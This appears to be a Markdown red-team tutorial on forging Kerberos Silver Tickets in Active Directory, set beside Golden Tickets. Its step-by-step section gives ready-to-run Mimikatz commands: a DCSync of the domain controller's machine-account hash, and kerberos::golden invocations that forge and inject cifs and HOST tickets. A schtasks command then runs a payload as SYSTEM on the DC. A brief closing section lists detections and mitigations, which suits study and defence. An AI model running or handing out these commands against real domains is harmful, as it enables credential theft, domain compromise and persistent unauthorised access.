# Silver Ticket Forgery in AD Environment 

## 📖 1. Core Fundamental Concepts

Kerberos ticket forgery attacks exploit how symmetric keys are used to encrypt and sign tickets in Active Directory.

### What is a Silver Ticket?
A **Silver Ticket** is a forged **Ticket Granting Service (TGS)** ticket. 
* It is created using the password hash (NTLM or AES) of a **specific service account or computer machine account** (e.g., `cifs`, `HOST`, `MSSQL`).
* **Scope:** Access is restricted strictly to the specific service and host tied to that account's secret key.
* **Stealth factor:** The client presents this forged TGS ticket directly to the target application server. **No communication occurs with the Domain Controller (KDC)** during authentication, meaning no TGS request events (`4769`) are logged on the DC.

### What is a Golden Ticket? 
A **Golden Ticket** is a forged **Ticket Granting Ticket (TGT)**.
* It is encrypted and signed using the password hash of the domain's Key Distribution Center service account: **`krbtgt`**.
* **Scope:** Complete domain-wide persistence. A Golden Ticket allows an attacker to request a valid TGS for *any* service on *any* computer across the entire Active Directory domain or forest.

---

## 📊 2. Golden Ticket vs. Silver Ticket Comparison

| Feature / Metric | Golden Ticket (Forged TGT) | Silver Ticket (Forged TGS) |
| :--- | :--- | :--- |
| **Ticket Type** | TGT (Ticket Granting Ticket) | TGS (Service Ticket) |
| **Key Used to Encrypt** | `krbtgt` NTLM or AES key | Target Service / Computer Account NTLM or AES key |
| **Privilege Scope** | Entire Domain / Forest (Full Admin) | Single Service on a Target Host (e.g., CIFS, HOST) |
| **DC Communication** | Interacts with the DC to exchange TGT for TGS | **Zero traffic to the DC** (Direct connection to target) |
| **Persistence Duration** | Typically forged for 10 years | Typically forged for hours to days |
| **Detection Profile** | Detected by abnormal TGS requests on DC | Difficult to detect on DC; must be caught on endpoint |
| **Prerequisites** | Requires Domain Admin (DCSync `krbtgt`) | Requires access to target computer account hash / service hash |

---

## 🔄 3. Silver Ticket Attack Flow

```text
+---------------------------------------------------------------------------------------------------+
|                                     SILVER TICKET ATTACK FLOW                                     |
+---------------------------------------------------------------------------------------------------+

   [ Foothold / Kali Machine ]                                         [ Target Server (e.g., DC-01) ]
               |                                                                     |
               | 1. Attacker has harvested:                                          |
               |    - Domain SID                                                     |
               |    - Target Machine Account NTLM Hash (e.g., DC-01$)                |
               |                                                                     |
               | 2. Attacker runs Mimikatz kerberos::golden                          |
               |    Forges TGS locally (bypassing KDC completely)                    |
               |                                                                     |
               | 3. Injects TGS into session via Pass-the-Ticket (/ptt)              |
               |                                                                     |
               | 4. Client presents forged TGS ticket directly to target service     |
               |-------------------------------------------------------------------->|
               |                                                                     |
               | 5. Target validates ticket signature using its own machine hash     |
               |    (Access Granted without contacting Domain Controller)             |
               |<--------------------------------------------------------------------|

```

---

## 🛠️ 4. Prerequisites for Forging Tickets

To construct a valid ticket using Mimikatz, four primary parameters are required:

1. **Domain Name (FQDN):** The target domain (e.g., `cyberwarfare.corp`).
2. **Domain Security Identifier (Domain SID):**
```cmd
whoami /user

```


*(Strip the trailing RID, e.g., `S-1-5-21-1234567890-1234567890-1234567890-500` becomes `S-1-5-21-1234567890-1234567890-1234567890`).*
3. **Target Service SPN:** The service class to forge (e.g., `cifs`, `HOST`, `http`, `MSSQLSvc`).
4. **Service / Computer NTLM Hash:** The hash of the target account associated with the SPN.

---

## 🚀 5. Practical Implementation (Step-by-Step)

### Step 1: Extract the Machine Account / Service Account Hash

To forge a Silver Ticket for services running on the Domain Controller, extract the computer account hash (e.g., `DC-01$`):

```powershell
# Execute DCSync targeting the machine account
Invoke-Mimikatz -Command ' "lsadump::dcsync /domain:cyberwarfare.corp /user:cyberwarfare\DC-01$" '

```

---

### Step 2: Forge and Inject a Silver Ticket for File System Access (`cifs`)

Forging a ticket for the `cifs` service grants administrative SMB/file share access (e.g., accessing `C$`):

```powershell
Invoke-Mimikatz -Command ' "kerberos::golden /user:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:enterprise-dc.cyberwarfare.corp /service:cifs /rc4:<MACHINE_ACCOUNT_NTLM_HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" '

```

* **`/user`**: User identity to impersonate (e.g., `Administrator`).
* **`/target`**: FQDN of the server hosting the service.
* **`/service`**: The Service Class (`cifs` for file shares).
* **`/rc4`**: NTLM hash of the target computer account (`DC-01$`).
* **`/id`**: User RID (`500` for built-in Administrator).
* **`/groups`**: Group membership RIDs (`512` for Domain Admins).
* **`/ptt`**: Injects the forged ticket directly into the current memory cache (Pass-the-Ticket).

**Verify ticket injection:**

```powershell
# Confirm the TGS exists in the local session cache
klist

# Access the remote C$ share without prompting for authentication
dir \\enterprise-dc.cyberwarfare.corp\C$

```

---

### Step 3: Forge a Silver Ticket for Remote Execution (`HOST`)

The `HOST` service principal covers multiple system execution capabilities, including service manipulation and scheduled tasks.

```powershell
# 1. Forge the Silver Ticket for the HOST service
Invoke-Mimikatz -Command ' "kerberos::golden /user:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:enterprise-dc.cyberwarfare.corp /service:HOST /rc4:<MACHINE_ACCOUNT_NTLM_HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" '

# 2. Schedule a remote task to execute an administrative payload
schtasks /create /S enterprise-dc.cyberwarfare.corp /SC Weekly /RU "NT AUTHORITY\SYSTEM" /TN "MaintenanceTask" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1"

```

---

## 🎯 6. Common Kerberos Service Classes for Silver Tickets

| Service Class | Capabilities Granted | Practical Use Case |
| --- | --- | --- |
| **`cifs`** | Full file system access via SMB | Read/Write to `\\target\C$`, `ADMIN$`. |
| **`HOST`** | Remote task scheduling and service registration | `schtasks`, WMI, service execution. |
| **`RPCSS / WSMAN`** | Remote management and execution | WMI execution, WinRM / PSRemoting access. |
| **`LDAP`** | Active Directory query and synchronization | DCSync operations against the target DC. |
| **`MSSQLSvc`** | Database administration | Full access to SQL Server database instances. |

---

## 🛡️ 7. Defensive Mitigations & Detection

| Technique | Detection / Defense Strategy |
| --- | --- |
| **PAC Validation** | Enable Kerberos PAC validation via **PAC Signature Validation** (e.g., CVE-2021-42287 / KB5008380 / KB5008602 updates), forcing target servers to verify PAC signatures with the KDC. |
| **Endpoint Auditing** | Monitor endpoint **Windows Security Event ID 4624 (Logon Type 3)** for Kerberos authentications where no corresponding **Event ID 4769 (TGS Request)** was logged on the Domain Controller. |
| **Credential Protection** | Rotate computer account passwords regularly (default Active Directory rotation is 30 days) and avoid using static custom user accounts for high-privilege service roles. |
| **Kerberos Encryption** | Enforce **AES-128 / AES-256** Kerberos keys across all service and machine accounts and disable legacy RC4-HMAC. |

